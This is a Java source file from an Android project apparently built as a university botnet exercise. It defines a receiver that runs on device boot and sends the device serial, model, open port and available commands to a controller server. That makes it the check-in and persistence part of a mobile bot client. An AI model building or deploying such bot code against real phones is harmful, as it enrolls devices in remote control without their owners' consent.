package de.tudarmstadt.botnet.janus_yanai;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.widget.Toast;


class SenderTask extends AsyncTask<Object, Void, CharSequence> {

	Context context;
	
	SenderTask(Context context) {
		super();
		this.context = context;
	}
	
	@Override
	protected CharSequence doInBackground(Object... params) {
	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://" + BotClientActivity.getIP(context) + "/updatestatus");

	    try {
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
	        nameValuePairs.add(new BasicNameValuePair("serial", Config.getID(context)));
	        nameValuePairs.add(new BasicNameValuePair("status", ( ((Boolean) params[0]) ? "on" : "off")));
	        nameValuePairs.add(new BasicNameValuePair("model", android.os.Build.MODEL));
	        nameValuePairs.add(new BasicNameValuePair("port", String.valueOf(Config.serverport)));
	        nameValuePairs.add(new BasicNameValuePair("servercommands", ServerActions.getInstance().getCommands().toString()));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	        
	        HttpResponse response = httpclient.execute(httppost);
	        //Toast.makeText(context, new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next(), Toast.LENGTH_LONG).show();
	        return new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next();
	    } catch (Exception e) {
	    	return Config.getID(context) + ": " + e.getMessage();
	    }
	}
	
	@Override
	protected void onPostExecute(CharSequence result) {
		Toast.makeText(context, result, Toast.LENGTH_SHORT);
	}

	public ServerActions getServerActions() {
		return ServerActions.getInstance();
	}
	
}



public class BootCompleteReceiver extends BroadcastReceiver implements CommandListListener {
		
	private static BootCompleteReceiver _instance;
	private Context context;
	
	public static BootCompleteReceiver getInstance(Context context) {
		if (_instance == null) _instance = new BootCompleteReceiver(context);
		return _instance;
	}
	
	BootCompleteReceiver(Context context) {
		this.context = context;
	}
	
	public void sendNotification(boolean status) {
		SenderTask task = new SenderTask(context);
		task.getServerActions().registerCommandListListener(this);
		task.execute(status);
	}
	
	@Override
	public void onReceive(Context context, Intent intent) {
		if (context != this.context) throw new RuntimeException("if this was started from an activity, how come it is receiving broadcasts? if it wasnt started from an activity, it context shouldnt have changed.");
		this.context = context;
		sendNotification(true);
		
		// TODO
		//Intent newinIntent = new Intent(context, ServerService.class);
        //context.startService(newinIntent);
	}

	@Override 
	public void commandListChanged() { // CommandListListener
		sendNotification(true);
	}

}
